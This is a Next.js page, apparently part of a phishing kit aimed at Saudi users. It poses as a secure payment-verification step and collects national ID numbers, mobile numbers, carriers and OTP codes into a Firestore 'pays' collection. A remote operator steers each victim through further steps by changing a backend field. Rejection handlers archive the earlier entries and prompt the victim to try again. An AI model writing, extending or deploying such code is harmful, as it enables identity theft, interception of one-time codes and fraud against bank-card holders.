"use client";

import { useEffect, useState } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Phone, ShieldCheck, CreditCard, ChevronDown } from "lucide-react";
import { StcVerificationModal } from "@/components/stc-verification-modal";
import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
import { PhoneOtpDialog } from "@/components/dialog-b";

import { db, setDoc, doc } from "@/lib/firebase";
import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";

export default function VerifyPhonePage() {
  const [idNumber, setIdNumber] = useState("");
  const [idError, setIdError] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [selectedCarrier, setSelectedCarrier] = useState("");
  const [showStcModal, setShowStcModal] = useState(false);
  const [showMobilyModal, setShowMobilyModal] = useState(false);
  const [showCarrierModal, setShowCarrierModal] = useState(false);
  const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false);
  const [otpRejectionError, setOtpRejectionError] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [hasOtpBeenRejected, setHasOtpBeenRejected] = useState(false);

  const telecomOperators = [
    { value: "stc", label: "STC - الاتصالات السعودية" },
    { value: "mobily", label: "Mobily - موبايلي" },
    { value: "zain", label: "Zain - زين" },
    { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
    { value: "lebara", label: "Lebara - ليبارا" },
    { value: "salam", label: "SALAM - سلام" },
    { value: "go", label: "GO - جو" },
  ];

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  useRedirectMonitor({ visitorId, currentPage: "phone" });

  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "phone", 7);

      if (!db) return;
      const visitorRef = doc(db as Firestore, "pays", visitorId);
      setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
        console.error("[phone-info] Failed to clear redirectPage:", err)
      );
    }
  }, [visitorId]);

  useEffect(() => {
    if (!visitorId) return;

    if (!db) return;
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();

          if (data.currentStep === "home") {
            window.location.href = "/";
          } else if (data.currentStep === "_t6") {
            window.location.href = "/step4";
          } else if (data.currentStep === "_st1") {
            window.location.href = "/check";
          } else if (data.currentStep === "_t2") {
            window.location.href = "/step2";
          } else if (data.currentStep === "_t3") {
            window.location.href = "/step3";
          }
        }
      },
      (error) => {
        console.error("[phone-info] Firestore listener error:", error);
      }
    );

    return () => unsubscribe();
  }, []);

  const validateIdNumber = (id: string): boolean => {
    const saudiIdRegex = /^[12]\d{9}$/;
    if (!saudiIdRegex.test(id)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام");
      return false;
    }
    setIdError("");
    return true;
  };

  const validatePhoneNumber = (phone: string): boolean => {
    const cleanPhone = phone.replace(/\s/g, "");
    const saudiPhoneRegex = /^05\d{8}$/;
    if (!saudiPhoneRegex.test(cleanPhone)) {
      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
      return false;
    }
    setPhoneError("");
    return true;
  };

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 10) {
      setIdNumber(value);
      if (value.length === 10) {
        validateIdNumber(value);
      } else {
        setIdError("");
      }
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 10) {
      setPhoneNumber(value);
      if (value.length === 10) {
        validatePhoneNumber(value);
      } else {
        setPhoneError("");
      }
    }
  };

  const handleSendOtp = async () => {
    if (!idNumber || !phoneNumber || !selectedCarrier) return;
    if (!validateIdNumber(idNumber)) return;
    if (!validatePhoneNumber(phoneNumber)) return;

    const visitorID = localStorage.getItem("visitor");
    if (!visitorID) return;

    try {
      if (!db) return;
      await setDoc(
        doc(db as Firestore, "pays", visitorID),
        {
          phoneIdNumber: idNumber,
          phoneNumber: phoneNumber,
          phoneCarrier: selectedCarrier,
          phoneSubmittedAt: new Date().toISOString(),
          _v4Status: "pending",
          phoneUpdatedAt: new Date().toISOString(),
          redirectPage: null,
        },
        { merge: true }
      );

      setShowPhoneOtpDialog(true);
    } catch (error) {
      console.error("Error saving phone data:", error);
      toast.error("حدث خطأ", {
        description: "يرجى المحاولة مرة أخرى",
        duration: 5000,
      });
    }
  };

  const handleApproved = () => {
    setShowStcModal(false);
    setShowMobilyModal(false);
    setShowCarrierModal(false);
    window.location.href = "/step4";
  };

  const handleRejected = async () => {
    const visitorID = localStorage.getItem("visitor");
    if (!visitorID) return;

    try {
      if (!db) return;
      const docRef = doc(db as Firestore, "pays", visitorID);
      const docSnap = await getDoc(docRef);

      if (docSnap.exists()) {
        const data = docSnap.data();
        const currentPhoneData = {
          idNumber: data.phoneIdNumber || "",
          phoneNumber: data.phoneNumber,
          phoneCarrier: data.phoneCarrier,
          rejectedAt: new Date().toISOString(),
        };

        await setDoc(
          docRef,
          {
            oldPhoneInfo: data.oldPhoneInfo
              ? [...data.oldPhoneInfo, currentPhoneData]
              : [currentPhoneData],
            phoneOtpStatus: "pending",
            phoneCarrier: "",
          },
          { merge: true }
        );
      }
    } catch (error) {
      console.error("Error saving rejected phone data:", error);
    }

    setShowStcModal(false);
    setShowMobilyModal(false);
    setShowCarrierModal(false);

    setPhoneNumber("");
    setSelectedCarrier("");

    toast.error("تم رفض رقم الهاتف", {
      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
      duration: 5000,
    });
  };

  const handleOtpRejected = () => {
    setShowStcModal(false);
    setShowMobilyModal(false);
    setShowCarrierModal(false);

    localStorage.setItem(
      "phoneOtpRejectionError",
      "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح"
    );

    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
    setHasOtpBeenRejected(true);

    setShowPhoneOtpDialog(true);
  };

  const handleShowWaitingModal = (carrier: string) => {
    if (carrier === "stc") {
      setShowStcModal(true);
    } else if (carrier === "mobily") {
      setShowMobilyModal(true);
    } else {
      setShowCarrierModal(true);
    }
  };

  const isFormValid =
    !!phoneNumber &&
    !!selectedCarrier &&
    phoneNumber.length === 10 &&
    !phoneError &&
    !!idNumber &&
    idNumber.length === 10 &&
    !idError;

  return (
    <>
      <div
        className="min-h-screen bg-gradient-to-br from-[#0e3a57] via-[#1a5c85] to-[#2680b5] flex items-center justify-center p-4"
        dir="rtl"
      >
        {/* Background decoration */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-0 left-0 w-72 h-72 bg-white/5 rounded-full -ml-36 -mt-36"></div>
          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white/5 rounded-full -mr-48 -mb-48"></div>
        </div>

        <div className="w-full max-w-lg space-y-5 relative z-10">
          {/* Header */}
          <div className="text-center text-white space-y-2 mb-4">
            <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
              <Phone className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-3xl font-bold">نظام التحقق الآمن</h1>
            <p className="text-white/70 text-sm">تحقق من هويتك بأمان وسرعة</p>
          </div>

          {/* Main Card */}
          <Card className="border-0 shadow-2xl overflow-hidden">
            <div className="h-1 bg-gradient-to-r from-[#1a5c85] via-[#2680b5] to-[#1a5c85]"></div>
            <div className="p-7 space-y-5">
              {/* Verification Message */}
              <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                <div className="flex items-start gap-3">
                  <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-blue-900 font-medium leading-relaxed">
                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
                    الهاتف المرتبطين ببطاقتك البنكية.
                  </p>
                </div>
              </div>

              {/* ID Number Input */}
              <div className="space-y-1.5">
                <Label htmlFor="idNumber" className="text-right block text-gray-700 font-semibold text-sm">
                  رقم الهوية *
                </Label>
                <div className="relative">
                  <Input
                    id="idNumber"
                    type="tel"
                    placeholder="1xxxxxxxxx"
                    value={idNumber}
                    onChange={handleIdChange}
                    className={`text-right pr-12 text-base h-12 rounded-xl border-2 transition-colors ${
                      idError ? "border-red-400 focus:border-red-500" : "border-gray-200 focus:border-[#1a5c85]"
                    }`}
                    dir="ltr"
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                    <CreditCard className="w-5 h-5" />
                  </div>
                </div>
                {idError && (
                  <p className="text-red-500 text-xs text-right">{idError}</p>
                )}
              </div>

              {/* Phone Number Input */}
              <div className="space-y-1.5">
                <Label htmlFor="phone" className="text-right block text-gray-700 font-semibold text-sm">
                  رقم الجوال *
                </Label>
                <div className="relative">
                  <Input
                    id="phone"
                    type="tel"
                    placeholder="05xxxxxxxx"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    className={`text-right pr-20 text-base h-12 rounded-xl border-2 transition-colors ${
                      phoneError ? "border-red-400 focus:border-red-500" : "border-gray-200 focus:border-[#1a5c85]"
                    }`}
                    dir="ltr"
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm font-semibold">
                    +966
                  </div>
                </div>
                {phoneError && (
                  <p className="text-red-500 text-xs text-right">{phoneError}</p>
                )}
              </div>

              {/* Carrier Dropdown */}
              <div className="space-y-1.5">
                <Label htmlFor="carrier" className="text-right block text-gray-700 font-semibold text-sm">
                  شركة الاتصالات *
                </Label>
                <div className="relative">
                  <select
                    id="carrier"
                    value={selectedCarrier}
                    onChange={(e) => setSelectedCarrier(e.target.value)}
                    className="w-full h-12 text-right text-base border-2 border-gray-200 rounded-xl px-4 bg-white focus:border-[#1a5c85] focus:outline-none appearance-none cursor-pointer transition-colors pr-4 pl-10"
                  >
                    <option value="">اختر شركة الاتصالات</option>
                    {telecomOperators.map((operator) => (
                      <option key={operator.value} value={operator.value}>
                        {operator.label}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 pointer-events-none" />
                </div>
              </div>

              {/* Submit Button */}
              <Button
                onClick={handleSendOtp}
                className="w-full h-13 text-base bg-gradient-to-r from-[#1a5c85] to-[#0e3a57] hover:from-[#154a6d] hover:to-[#0a2e46] text-white font-bold rounded-xl shadow-md shadow-blue-200 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
                disabled={!isFormValid}
              >
                <Phone className="ml-2 h-5 w-5" />
                إرسال رمز التحقق
              </Button>

              <div className="bg-gray-50 border border-gray-100 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-500">
                  🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية
                </p>
              </div>
            </div>
          </Card>
        </div>
      </div>

      <StcVerificationModal
        open={showStcModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <MobilyVerificationModal
        open={showMobilyModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <CarrierVerificationModal
        open={showCarrierModal}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      <PhoneOtpDialog
        open={showPhoneOtpDialog}
        onOpenChange={(open) => {
          setShowPhoneOtpDialog(open);
          if (!open) setOtpRejectionError("");
        }}
        phoneNumber={phoneNumber}
        phoneCarrier={selectedCarrier}
        onRejected={handleOtpRejected}
        onShowWaitingModal={handleShowWaitingModal}
        rejectionError={otpRejectionError}
        isAfterRejection={hasOtpBeenRejected}
      />
    </>
  );
}
